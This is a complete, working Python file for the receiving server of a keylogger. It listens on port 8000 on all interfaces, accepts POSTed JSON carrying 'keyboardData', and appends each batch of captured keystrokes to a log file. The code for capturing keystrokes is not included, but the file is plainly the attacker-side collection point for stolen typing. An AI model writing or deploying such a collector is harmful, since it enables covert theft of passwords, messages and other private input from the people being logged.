from http.server import BaseHTTPRequestHandler, HTTPServer
import json

# Server IP and Port
ip_address = "0.0.0.0"
port_number = 8000

# File to save keystrokes
log_file = "keylog_output.txt"

class KeylogHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Get content length to read the correct amount of data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Parse JSON data
        try:
            data = json.loads(post_data)
            keyboard_data = data.get("keyboardData", "")
            print(f"Received data: {keyboard_data}")

            # Append data to the file
            with open(log_file, "a") as f:
                f.write(keyboard_data + "\n")
                
            # Send a response back to the client
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Data received and logged.")
        except json.JSONDecodeError:
            # Handle JSON errors if malformed data is received
            print("Received invalid JSON data.")
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Invalid data format.")

if __name__ == "__main__":
    server_address = (ip_address, port_number)
    httpd = HTTPServer(server_address, KeylogHandler)
    print(f"Server running on http://{ip_address}:{port_number}")
    httpd.serve_forever()
